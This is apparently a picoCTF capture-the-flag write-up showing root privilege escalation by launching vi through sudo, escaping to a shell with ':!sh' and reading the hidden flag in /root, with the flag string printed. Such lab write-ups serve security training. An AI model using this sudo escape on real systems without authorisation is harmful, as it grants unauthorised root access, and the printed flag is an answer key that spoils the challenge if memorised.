# Overview 
Category: [General Skills]()

AUTHOR: GEOFFREY NJOGU

# Description
Can you read files in the root file?

# Solution
- We can run vim as root user using sudo vi, for the privilege escalation:
```
sudo vi
```
Now we are running Vim as root and can run command mode inside Vim by using ":!sh" and pressing enter.
>:!sh

- As we can see now, we have a shell with root access .
```
Press ENTER or type command to continue
# whoami
root
# pwd
/home/picoplayer
# cd ../..
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls -a
.  ..  .bashrc  .flag.txt  .profile
# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```